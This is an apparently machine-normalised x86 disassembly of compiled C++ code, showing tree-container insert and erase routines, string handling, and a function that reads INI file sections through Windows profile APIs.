mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_426370
push 0xffffffff
push sub_43279b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
add ecx 0xc
call sub_426210
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4263b0
push 0xffffffff
push sub_4327cc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x0
mov edx [ esp + 0x1c ]
lea ecx [ esi + 0x1c ]
push edx
mov [ esp + 0x1c ] ecx
call sub_426120
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_426410
push 0xffffffff
push sub_4327eb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] ecx
push eax
lea ecx [ esi + 0xc ]
mov [ esp + 0x8 ] esi
mov [ esi + 0x8 ] edx
call sub_426310
xor eax eax
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x28 ]
mov [ esi + 0x34 ] cl
mov [ esi + 0x35 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x14
sub_4264a0
push ebp
mov ebp esp
push 0xffffffff
push sub_432811
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x38
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_426410
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_426550
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_432829
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x6666665
jb r-xdata
mov edx [ esp + 0x64 ]
mov eax [ edi + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x68 ]
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_4264a0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x50 ] 0x0
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call _CxxThrowException
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x34 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x60 ]
mov [ edx + 0x34 ] bl
pop esi
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
mov edi edi
cmp [ edx + 0x34 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x34 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ ecx + 0x34 ] bl
mov [ edx + 0x34 ] bl
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x34 ] 0x0
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov cl [ edx + 0x34 ]
test cl cl
lea eax [ esi + 0x4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x34 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x34 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_424170
mov esi ecx
push esi
mov ecx edi
call sub_423880
mov eax [ esi + 0x4 ]
mov [ eax + 0x34 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x34 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_423880
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_424170
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_426700
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov esi [ edi + 0x4 ]
mov cl [ esi + 0x35 ]
test cl cl
mov al 0x1
mov [ esp + 0x10 ] al
jne r-xdata
test al al
mov esi edi
mov [ esp + 0x1c ] esi
je r-xdata
mov edi edi
lea edx [ esi + 0xc ]
push ebp
push edx
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp edi [ ecx ]
jne r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
pop ecx
retn 0x8
mov eax [ esp + 0x10 ]
push ebp
push edi
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebx
call sub_426550
mov edx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea ecx [ esp + 0x1c ]
call sub_423ae0
mov esi [ esp + 0x1c ]
push ebp
push edi
push 0x1
lea edx [ esp + 0x28 ]
push edx
mov ecx ebx
call sub_426550
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0xc ]
push eax
push ebp
mov edi esi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov cl [ esi + 0x35 ]
test cl cl
je r-xdata
sub_4267e0
push 0xffffffff
push sub_432870
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
mov eax [ esp + 0x64 ]
push ebx
mov ebx ecx
mov cl [ eax + 0x35 ]
test cl cl
mov [ esp + 0x4 ] ebx
je r-xdata
push ebp
push esi
mov ebp eax
push edi
lea ecx [ esp + 0x74 ]
mov [ esp + 0x14 ] ebp
call sub_424310
mov eax [ ebp ]
mov cl [ eax + 0x35 ]
test cl cl
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x5c ] 0x0
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_40af50
push r--data
lea ecx [ esp + 0x30 ]
push ecx
call _CxxThrowException
mov edx [ ebp + 0x8 ]
mov cl [ edx + 0x35 ]
test cl cl
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x74 ]
cmp ecx ebp
mov edi [ ecx + 0x8 ]
jne r-xdata
mov edi eax
jmp r-xdata
mov al [ edi + 0x35 ]
test al al
mov esi [ ebp + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ ebp ]
mov [ ecx ] edx
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ edi + 0x4 ] esi
mov al [ edi + 0x35 ]
test al al
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebp
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ ebx + 0x4 ]
cmp [ ebx ] ebp
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax ] ebp
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x8 ] ebp
jne r-xdata
mov al [ edi + 0x35 ]
test al al
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x4 ]
mov [ ecx + 0x4 ] eax
mov dl [ ebp + 0x34 ]
mov al [ ecx + 0x34 ]
mov [ ecx + 0x34 ] dl
mov [ ebp + 0x34 ] al
mov al [ ebp + 0x34 ]
mov bl 0x1
cmp al bl
jne r-xdata
mov al [ edi + 0x35 ]
test al al
je r-xdata
push edi
call sub_423a70
add esp 0x4
mov eax esi
jmp r-xdata
or ebp 0xffffffff
mov [ esp + 0x68 ] ebp
mov ebx [ esp + 0x14 ]
lea edi [ ebx + 0xc ]
mov [ esp + 0x14 ] edi
mov eax 0x2
mov [ esp + 0x68 ] eax
lea esi [ edi + 0x1c ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x68 ] al
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0x20 ]
push eax
mov ecx esi
call sub_425eb0
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
xor eax eax
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esp + 0x68 ] ebp
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
call ??3@YAXPAX@Z
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
test eax eax
pop edi
pop esi
pop ebp
jbe r-xdata
mov ebp [ esp + 0x10 ]
mov eax [ ebp + 0x4 ]
cmp edi [ eax + 0x4 ]
je r-xdata
push edi
call sub_423a50
add esp 0x4
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] eax
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x64 ]
mov [ eax ] ecx
mov ecx [ esp + 0x54 ]
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x34 ] bl
jmp r-xdata
cmp [ edi + 0x34 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
mov cl [ eax + 0x34 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x34 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x35 ]
test cl cl
jne r-xdata
mov [ eax + 0x34 ] bl
push esi
mov ecx ebp
mov [ esi + 0x34 ] 0x0
call sub_423880
mov eax [ esi ]
mov cl [ eax + 0x35 ]
test cl cl
jne r-xdata
mov [ eax + 0x34 ] bl
push esi
mov ecx ebp
mov [ esi + 0x34 ] 0x0
call sub_424170
mov eax [ esi + 0x8 ]
mov eax [ ebp + 0x4 ]
mov ecx [ eax + 0x4 ]
mov edi esi
cmp edi ecx
mov esi [ esi + 0x4 ]
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x34 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x34 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x34 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x34 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x34 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x34 ] bl
je r-xdata
mov cl [ esi + 0x34 ]
mov [ eax + 0x34 ] cl
mov [ esi + 0x34 ] bl
mov edx [ eax ]
push esi
mov ecx ebp
mov [ edx + 0x34 ] bl
call sub_423880
mov edx [ eax + 0x8 ]
mov [ edx + 0x34 ] bl
push eax
mov ecx ebp
mov [ eax + 0x34 ] 0x0
call sub_424170
mov eax [ esi ]
mov [ eax + 0x34 ] 0x0
mov cl [ esi + 0x34 ]
mov [ eax + 0x34 ] cl
mov [ esi + 0x34 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx ebp
mov [ edx + 0x34 ] bl
call sub_424170
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x34 ] bl
push eax
mov ecx ebp
mov [ eax + 0x34 ] 0x0
call sub_423880
mov eax [ esi + 0x8 ]
sub_426af0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x35 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_426af0
mov esi [ esi ]
mov ecx edi
call sub_426370
push edi
call ??3@YAXPAX@Z
mov al [ esi + 0x35 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_426b30
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
push edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edi [ esp + 0x1c ]
push ebx
mov ebx [ esp + 0x1c ]
cmp ebx ecx
push ebp
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esi + 0x4 ]
mov edi [ esp + 0x14 ]
push eax
push ecx
push 0x1
push edi
mov ecx esi
call sub_426550
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
cmp ebx eax
jne r-xdata
lea edx [ ebx + 0xc ]
push edx
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
lea eax [ ebx + 0xc ]
push eax
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov eax [ eax + 0x8 ]
add eax 0xc
push edi
push eax
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
push edi
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
call sub_426700
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
pop ebp
pop ebx
pop edi
mov [ eax ] ecx
pop esi
add esp 0x8
retn 0xc
push edi
mov edi [ esp + 0x20 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_426550
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
lea eax [ ebx + 0xc ]
push edi
push eax
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
call sub_423ae0
mov ebp [ esp + 0x24 ]
push edi
lea edx [ ebp + 0xc ]
push edx
mov ecx esi
call sub_40aa60
test al al
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push edi
mov edi [ esp + 0x20 ]
push ecx
push 0x0
push edi
mov ecx esi
call sub_426550
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
call sub_424310
mov ebp [ esp + 0x24 ]
cmp ebp [ esi + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x35 ]
push edi
mov edi [ esp + 0x20 ]
test cl cl
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
mov al [ edx + 0x35 ]
test al al
push edi
mov edi [ esp + 0x20 ]
mov ecx esi
je r-xdata
lea ecx [ ebp + 0xc ]
push ecx
push edi
mov ecx esi
call sub_40aa60
test al al
je r-xdata
push ebx
push 0x1
push edi
call sub_426550
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
push 0x0
push edi
call sub_426550
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
push 0x1
push edi
call sub_426550
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebx
push 0x0
push edi
call sub_426550
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
sub_426cf0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_426af0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_426d20
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_432890
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebp
mov ebp [ esp + 0x48 ]
push esi
push edi
push ebp
mov edi ecx
call sub_423fb0
mov esi eax
cmp esi [ edi + 0x4 ]
je r-xdata
lea ecx [ esp + 0xc ]
call sub_426260
mov [ esp + 0x48 ] 0x0
push eax
push ebp
lea ecx [ esp + 0x20 ]
call sub_4263b0
mov [ esp + 0x48 ] 0x1
push eax
push esi
lea eax [ esp + 0x58 ]
push eax
mov ecx edi
call sub_426b30
mov esi [ eax ]
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x18 ]
call sub_426210
mov [ esp + 0x48 ] 0xffffffff
lea ecx [ esp + 0xc ]
call sub_4261b0
lea eax [ esi + 0xc ]
push eax
push ebp
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ esp + 0x40 ]
pop edi
lea eax [ esi + 0x28 ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x40
retn 0x4
sub_426dd0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x35 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_426af0
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_4267e0
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x35 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x35 ]
test dl dl
je r-xdata
jmp r-xdata
sub_426e90
push ebp
lea ebp [ esp - 0xa030 ]
push 0xffffffff
push sub_4328e1
mov eax [ fs : 0x0 ]
push eax
mov eax 0xa0a4
mov [ fs : 0x0 ] esp
call sub_42e910
mov eax [ rw-data ]
push ebx
push esi
push edi
mov esi ecx
push rw-data
mov [ ebp + 0xa020 ] eax
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x64 ] rw-data
call [ EnterCriticalSection@IAT ]
xor edi edi
mov [ ebp + 0xa02c ] edi
lea ecx [ ebp + 0x9fb0 ]
lea ebx [ ebp - 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x1
lea ecx [ ebp + 0xa004 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x2
lea ecx [ ebp + 0x9fcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x3
call [ rw-data ]
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x5c ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
inc eax
mov [ ebp - 0x58 ] eax
add eax eax
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov edi esp
test edi edi
je r-xdata
mov [ ebp - 0x54 ] edi
jmp r-xdata
mov [ ebp - 0x54 ] 0x0
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x5c ]
push eax
push edi
push 0xffffffff
push esi
push 0x0
push ecx
mov [ edi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax edi
mov [ ebp - 0x54 ] eax
jmp r-xdata
lea edx [ ebp - 0x50 ]
push edx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
xor eax eax
mov ecx [ ebp - 0x5c ]
push edi
push esi
push 0xffffffff
lea eax [ ebp - 0x50 ]
push eax
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov [ ebp + 0xa02c ] 0x2
lea ecx [ ebp + 0x9fcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x1
lea ecx [ ebp + 0xa004 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x0
lea ecx [ ebp + 0x9fb0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
lea esp [ ebp - 0x8c ]
mov ecx [ ebp + 0xa024 ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp + 0xa020 ]
call sub_42e72f
pop edi
pop esi
pop ebx
add ebp 0xa030
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edx [ ebp - 0x54 ]
push edx
push 0x5000
push eax
call [ GetPrivateProfileSectionNamesW@IAT ]
mov al [ ebp - 0x50 ]
test al al
je r-xdata
push ebx
lea ecx [ ebp + 0x9fe8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0xa02c ] 0x4
push 0x0
push r--data
lea ecx [ ebp + 0x9fe8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
mov ecx [ ebp - 0x60 ]
add ecx 0x4
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
test eax eax
mov [ ebp - 0x58 ] eax
je r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
mov [ ebp - 0x54 ] 0x0
push eax
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x5c ]
push edi
push esi
push 0xffffffff
lea edx [ ebp + 0x4fb0 ]
push edx
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x58 ] eax
jmp r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ ebp - 0x5c ]
push edi
push esi
push 0xffffffff
push edx
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x54 ] eax
jmp r-xdata
sub eax edx
lea ebx [ ebx + eax + 0x1 ]
mov [ ebp + 0xa02c ] 0x3
lea ecx [ ebp + 0x9fe8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebx ] 0x0
jne r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
test ebx ebx
je r-xdata
lea ecx [ ebp + 0x4fb0 ]
push ecx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
jmp r-xdata
lea ebx [ ebx ]
mov ecx [ ebp - 0x5c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edx [ ebp - 0x54 ]
mov ecx [ ebp - 0x58 ]
push edx
push 0x5000
push ecx
push eax
call [ GetPrivateProfileSectionW@IAT ]
mov al [ ebp + 0x4fb0 ]
test al al
lea edi [ ebp + 0x4fb0 ]
je r-xdata
sub eax edx
lea edi [ edi + eax + 0x1 ]
cmp [ edi ] 0x0
jne r-xdata
push edi
lea ecx [ ebp + 0xa004 ]
